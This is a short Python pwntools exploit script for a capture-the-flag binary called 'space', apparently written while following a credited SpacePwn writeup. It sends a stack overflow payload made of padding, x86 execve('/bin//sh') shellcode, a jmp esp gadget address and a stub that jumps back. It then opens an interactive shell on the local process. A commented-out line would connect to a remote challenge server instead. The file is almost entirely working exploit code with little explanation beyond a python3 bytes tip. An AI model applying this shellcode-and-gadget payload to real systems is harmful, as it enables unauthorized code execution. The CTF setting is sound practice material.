# Credit: Ashok Gaire's writeup assisted with locating the memory address for
# new stack @ beginning of user input buffer.
# https://ashokgaire.github.io/posts/SpacePwn/

from pwn import *

# Same syntax as python2
# Load Context, binary, libc
context.terminal = ['tmux','splitw' ,'-h']
context.binary = "./space"
binary = ELF("space")
#libc = ELF("libc.so.6")

# Same syntax as python2
#p = remote("178.62.88.144", 30677)
p = process("./space")
#p = gdb.debug("./space", "break *main")

# Same as python2
jmp_esp = p32(0x0804919f)
call_eax = p32(0x08049019)


# python3 doesn't like concatenating differing data types within a variable, python3
# WRONG: payload = str + bytes  # Concats different datatypes in variable, python2
# RIGHT: str = b'hello'
#        bytes = b'\x41\x41'
#        payload = str + byte   # Concats variables with different datatypes.
#        p.sendline(payload)
#
shellcode = b"\x31\xd2\x31\xc0\x83\xec\x15\xff\xe4"
junk = b"A"
shellcode2 = b"\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"


payload = junk + shellcode2 + jmp_esp + shellcode

p.sendline(payload)
p.interactive()

